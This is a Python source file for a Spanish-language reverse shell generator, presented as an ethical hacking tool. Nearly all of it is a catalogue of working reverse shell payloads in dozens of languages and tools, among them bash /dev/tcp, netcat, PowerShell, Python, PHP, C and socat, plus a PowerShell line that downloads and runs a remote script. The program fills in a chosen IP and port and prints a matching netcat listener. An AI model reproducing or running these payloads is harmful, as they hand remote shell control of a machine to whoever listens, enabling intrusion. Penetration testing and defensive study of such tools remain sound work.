#!/bin/python3

import argparse
from colorama import init, Fore, Style

# Inicializar colorama
init(autoreset=True)

# Definir los formatos de reverse shell manualmente
formatos_reverse_shell = {
    "bash -i": "/bin/sh -i >& /dev/tcp/{{ip}}/{{puerto}} 0>&1",
    "bash 196": "0<&196;exec 196<>/dev/tcp/{{ip}}/{{puerto}}; /bin/sh <&196 >&196 2>&196",
    "bash read line": "exec 5<>/dev/tcp/{{ip}}/{{puerto}};cat <&5 | while read line; do $line 2>&5 >&5; done",
    "bash 5": "/bin/sh -i 5<> /dev/tcp/{{ip}}/{{puerto}} 0<&5 1>&5 2>&5",
    "bash udp": "/bin/sh -i >& /dev/udp/{{ip}}/{{puerto}} 0>&1",
    "nc mkfifo": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{ip}} {{puerto}} >/tmp/f",
    "nc -e": "nc {{ip}} {{puerto}} -e /bin/sh",
    "nc.exe -e": "nc.exe {{ip}} {{puerto}} -e /bin/sh",
    "BusyBox nc -e": "busybox nc {{ip}} {{puerto}} -e /bin/sh",
    "nc -c": "nc -c /bin/sh {{ip}} {{puerto}}",
    "ncat -e": "ncat {{ip}} {{puerto}} -e /bin/sh",
    "ncat.exe -e": "ncat.exe {{ip}} {{puerto}} -e /bin/sh",
    "ncat udp": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|ncat -u {{ip}} {{puerto}} >/tmp/f",
    "curl": "C='curl -Ns telnet://{{ip}}:{{puerto}}'; $C </dev/null 2>&1 | /bin/sh 2>&1 | $C >/dev/null",
    "rustcat": "rcat connect -s /bin/sh {{ip}} {{puerto}}",
    "C": '''#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = {{puerto}};
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("{{ip}}");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/sh", NULL};
    execvp("/bin/sh", argv);

    return 0;       
}''',
"C# bash -i": '''using System;
using System.Diagnostics;

namespace BackConnect {
  class ReverseBash {
    public static void Main(string[] args) {
      Process proc = new System.Diagnostics.Process();
      proc.StartInfo.FileName = "/bin/sh";
      proc.StartInfo.Arguments = "-c \\"/bin/sh -i >& /dev/tcp/{{ip}}/{{puerto}} 0>&1\\"";
      proc.StartInfo.UseShellExecute = false;
      proc.StartInfo.RedirectStandardOutput = true;
      proc.Start();

      while (!proc.StandardOutput.EndOfStream) {
        Console.WriteLine(proc.StandardOutput.ReadLine());
      }
    }
  }
}''',
"PHP exec": "php -r '$sock=fsockopen(\"{{ip}}\",{{puerto}});exec(\"/bin/sh <&3 >&3 2>&3\");'",
    "PHP shell_exec": "php -r '$sock=fsockopen(\"{{ip}}\",{{puerto}});shell_exec(\"/bin/sh <&3 >&3 2>&3\");'",
    "PHP system": "php -r '$sock=fsockopen(\"{{ip}}\",{{puerto}});system(\"/bin/sh <&3 >&3 2>&3\");'",
    "PHP passthru": "php -r '$sock=fsockopen(\"{{ip}}\",{{puerto}});passthru(\"/bin/sh <&3 >&3 2>&3\");'",
    "PHP": "php -r '$sock=fsockopen(\"{{ip}}\",{{puerto}});/bin/sh <&3 >&3 2>&3;'",
    "PHP popen": "php -r '$sock=fsockopen(\"{{ip}}\",{{puerto}});popen(\"/bin/sh <&3 >&3 2>&3\", \"r\");'",
    "PHP proc_open": "php -r '$sock=fsockopen(\"{{ip}}\",{{puerto}});$proc=proc_open(\"/bin/sh\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'",
    "Windows ConPty": "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {{ip}} {{puerto}}",
    "PowerShell #1": "$LHOST = \"{{ip}}\"; $LPORT = {{puerto}}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write(\"$Output`n\"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()",
    "PowerShell #2": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{{ip}}',{{puerto}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
    "PowerShell #3": "powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('{{ip}}', {{puerto}});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()",
    "PowerShell #4 (TLS)": "$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('{{ip}}', {{puerto}});$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()",
    "Python #1": "export RHOST=\"{{ip}}\";export RPORT={{puerto}};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'",
    "Python #2": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{{ip}}\",{{puerto}}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'",
    "Python #3": "export RHOST=\"{{ip}}\";export RPORT={{puerto}};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'",
    "Python #4": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{{ip}}\",{{puerto}}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'",
    "Python #5": "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{{ip}}\",{{puerto}}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/sh\")'",
    "Ruby #1": "ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"{{ip}}\",{{puerto}}))'",
    "Ruby no sh": "ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"{{ip}}\",\"{{puerto}}\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/(cd .+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}'",
    "socat #1": "socat TCP:{{ip}}:{{puerto}} EXEC:'/bin/sh'",
    "socat #2 (TTY)": "socat TCP:{{ip}}:{{puerto}} EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane",
    "sqlite3 nc mkfifo": "sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{ip}} {{puerto}} >/tmp/f'",
    "node.js": "require('child_process').exec('nc -e /bin/sh {{ip}} {{puerto}}')",
    "String x": "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"<COMMAND>\")",
    "Groovy": "String host=\"{{ip}}\";int port={{puerto}};String cmd=\"/bin/sh\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();",
    "telnet": "TF=$(mktemp -u);mkfifo $TF && telnet {{ip}} {{puerto}} 0<$TF | /bin/sh 1>$TF",
    "zsh": "zsh -c 'zmodload zsh/net/tcp && ztcp {{ip}} {{puerto}} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",
    "Lua #1": "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{{ip}}','{{puerto}}');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
    "Lua #2": "lua5.1 -e 'local host, port = \"{{ip}}\", {{puerto}} local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'",
    "Golang": "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"{{ip}}:{{puerto}}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go",
    "Vlang": "echo 'import os' > /tmp/t.v && echo 'fn main() { os.system(\"nc -e /bin/sh {{ip}} {{puerto}} 0>&1\") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v",
    "Awk": "awk 'BEGIN {s = \"/inet/tcp/0/{{ip}}/{{puerto}}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null",
    "Dart": "import 'dart:io'; import 'dart:convert'; main() { Socket.connect(\"{{ip}}\", {{puerto}}).then((socket) { socket.listen((data) { Process.start('/bin/sh', []).then((Process process) { process.stdin.writeln(new String.fromCharCodes(data).trim()); process.stdout .transform(utf8.decoder) .listen((output) { socket.write(output); }); }); }, onDone: () { socket.destroy(); }); });",
    "Crystal (system)": "crystal eval 'require \"process\";require \"socket\";c=Socket.tcp(Socket::Family::INET);c.connect(\"{{ip}}\",{{puerto}});loop{m,l=c.receive;p=Process.new(m.rstrip(\"\\n\"),output:Process::Redirect::Pipe,shell:true);c<<p.output.gets_to_end}'",
    "Crystal (code)": "require \"process\" require \"socket\" c = Socket.tcp(Socket::Family::INET) c.connect(\"{{ip}}\", {{puerto}}) loop do m, l = c.receive p = Process.new(m.rstrip(\"\\n\"), output:Process::Redirect::Pipe, shell:true) c << p.output.gets_to_end end"
}

# Función para generar la reverse shell basada en el tipo seleccionado
def generar_reverse_shell(tipo_shell, ip, puerto):
    if tipo_shell in formatos_reverse_shell:
        formato = formatos_reverse_shell[tipo_shell].replace("{{ip}}", ip).replace("{{puerto}}", puerto)
        print(f"{Fore.GREEN}Formato encontrado:{Style.RESET_ALL} {formato}")
        print()  # Imprimir línea en blanco
    else:
        print(f"{Fore.RED}No se encontró una reverse shell para {tipo_shell}.{Style.RESET_ALL}")

# Función para mostrar el comando nc para escuchar en el puerto especificado
def mostrar_comando_nc(puerto):
    return f"{Fore.GREEN}Comando nc para escuchar en el puerto {puerto}:{Style.RESET_ALL} nc -lvnp {puerto}"

# Función para mostrar todos los formatos disponibles con ejemplos
def mostrar_formatos_disponibles():
    print(f"{Fore.CYAN}Formatos disponibles:{Style.RESET_ALL}")
    for tipo_shell, formato in formatos_reverse_shell.items():
        ejemplo = formato.replace("{{ip}}", "<IP>").replace("{{puerto}}", "<PORT>")
        print(f"- {tipo_shell} = {ejemplo}")

# Función principal
def main():
    # Imprimir logo al inicio
    print(f"""{Fore.CYAN}
  ____       _     _     ____            
 / ___|  ___| |__ (_)_ __| __ )  _____  __
 \___ \ / __| '_ \| | '__|  _ \ / _ \ \/ /
  ___) | (__| | | | | |  | |_) | (_) >  < 
 |____/ \___|_| |_|_|_|  |____/ \___/_/\_\\

 Tool for Ethical Hacking - Reverse Shell Generator
 
 revShell v1.0
 by Diseo (@d1se0)
 --------------------------------------------------{Style.RESET_ALL}
    """)
    
    # Definir argumentos de línea de comandos
    parser = argparse.ArgumentParser(description="Generador de reverse shells y comando nc para hacking ético.")
    parser.add_argument("-i", "--ip_host", required=False, help="Dirección IP del host para la reverse shell.")
    parser.add_argument("-p", "--port", required=False, help="Puerto de escucha para la reverse shell y el comando nc.")
    parser.add_argument("-t", "--tipo", required=False, help="Tipo de formato de reverse shell (ejemplo: bash -i, bash 196, etc.).")
    parser.add_argument("-fh", "--format-help", action="store_true", help="Mostrar todos los formatos disponibles de reverse shell.")
    args = parser.parse_args()

    # Mostrar todos los formatos disponibles si se proporciona el argumento -fh
    if args.format_help:
        mostrar_formatos_disponibles()
        return
    
    # Validar que se hayan proporcionado los argumentos obligatorios
    if not args.ip_host or not args.port or not args.tipo:
        parser.print_help()
        return
    
    # Generar la reverse shell si se especifica el tipo
    generar_reverse_shell(args.tipo, args.ip_host, args.port)

    # Mostrar el comando nc para escuchar en el puerto especificado
    print(mostrar_comando_nc(args.port))

if __name__ == "__main__":
    main()
